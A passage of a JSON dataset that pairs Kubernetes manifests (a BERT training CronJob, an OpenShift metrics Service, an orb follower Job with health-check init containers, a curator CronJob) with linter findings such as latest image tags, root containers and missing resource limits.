    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.4.0-bert-squad-func-v100-x1\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - args:\n          - python3\n          - official/nlp/bert/run_squad.py\n          - --input_meta_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_meta_data.json\n          - --train_data_path=gs://xl-ml-test-us-central1/data/squad/squad_v1.1_train.tfrecord\n          - --predict_file=gs://xl-ml-test-us-central1/data/squad/dev-v1.1.json\n          - --learning_rate=8e-5\n          - --do_lower_case=true\n          - --model_dir=$(MODEL_DIR)\n          - --vocab_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/vocab.txt\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-12_H-768_A-12/bert_model.ckpt\n          - --num_gpus=1\n          - --train_batch_size=8\n          - --predict_batch_size=8\n          - --mode=train\n          - --num_train_epochs=1\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.4.0\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              nvidia.com/gpu: 1\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.4.0/bert-squad/func/v100-x1/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.4.0-bert-squad-func-v100-x1\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "7909",
    "manifest_path": "data/manifests/the_stack_sample/sample_2913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.alpha.openshift.io/serving-cert-secret-name: kube-apiserver-operator-serving-cert\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n  labels:\n    app: kube-apiserver-operator\n  name: metrics\n  namespace: openshift-kube-apiserver-operator\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: kube-apiserver-operator\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kube-apiserver-operator])"
  },
  {
    "id": "7910",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7911",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"healthcheck-orb1-ready\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7912",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"healthcheck-orb2-ready\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7913",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"orb-add-followers\" is using an invalid container image, \"alpine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7914",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"healthcheck-orb1-ready\" does not have a read-only root file system"
  },
  {
    "id": "7915",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"healthcheck-orb2-ready\" does not have a read-only root file system"
  },
  {
    "id": "7916",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"orb-add-followers\" does not have a read-only root file system"
  },
  {
    "id": "7917",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"healthcheck-orb1-ready\" is not set to runAsNonRoot"
  },
  {
    "id": "7918",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"healthcheck-orb2-ready\" is not set to runAsNonRoot"
  },
  {
    "id": "7919",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"orb-add-followers\" is not set to runAsNonRoot"
  },
  {
    "id": "7920",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"healthcheck-orb1-ready\" has cpu request 0"
  },
  {
    "id": "7921",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"healthcheck-orb2-ready\" has cpu request 0"
  },
  {
    "id": "7922",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"orb-add-followers\" has cpu request 0"
  },
  {
    "id": "7923",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"healthcheck-orb1-ready\" has memory limit 0"
  },
  {
    "id": "7924",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"healthcheck-orb2-ready\" has memory limit 0"
  },
  {
    "id": "7925",
    "manifest_path": "data/manifests/the_stack_sample/sample_2914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: orb-add-followers\nspec:\n  template:\n    spec:\n      volumes:\n      - name: script\n        configMap:\n          name: orb-add-followers-script\n      initContainers:\n      - name: healthcheck-orb1-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-1/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-1 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      - name: healthcheck-orb2-ready\n        image: busybox\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'while [[ \"$(wget -T 5 -S --spider http://orb-2/healthcheck 2>&1 | grep\n          ''200 OK'')\" == \"\" ]];\n\n          do echo \"waiting for orb-2 endpoint\";\n\n          sleep 5;\n\n          done;\n\n          '\n      containers:\n      - name: orb-add-followers\n        image: alpine:latest\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        args:\n        - /opt/create_follow_activity.sh\n        volumeMounts:\n        - name: script\n          mountPath: /opt\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"orb-add-followers\" has memory limit 0"
  },
  {
    "id": "7926",
    "manifest_path": "data/manifests/the_stack_sample/sample_2915.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: clear\n          env:\n          - name: LOG_LEVEL\n            value: DEBUG\n          image: ymian/curator:latest\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"clear\" is using an invalid container image, \"ymian/curator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7927",
    "manifest_path": "data/manifests/the_stack_sample/sample_2915.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: clear\n          env:\n          - name: LOG_LEVEL\n            value: DEBUG\n          image: ymian/curator:latest\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"clear\" does not have a read-only root file system"
  },
  {
    "id": "7928",
    "manifest_path": "data/manifests/the_stack_sample/sample_2915.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: clear\n          env:\n          - name: LOG_LEVEL\n            value: DEBUG\n          image: ymian/curator:latest\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"clear\" is not set to runAsNonRoot"
  },
  {
    "id": "7929",
    "manifest_path": "data/manifests/the_stack_sample/sample_2915.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: clear\n          env:\n          - name: LOG_LEVEL\n            value: DEBUG\n          image: ymian/curator:latest\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"clear\" has cpu request 0"
  },
  {
    "id": "7930",
    "manifest_path": "data/manifests/the_stack_sample/sample_2915.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: curator\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: clear\n          env:\n          - name: LOG_LEVEL\n            value: DEBUG\n          image: ymian/curator:latest\n",
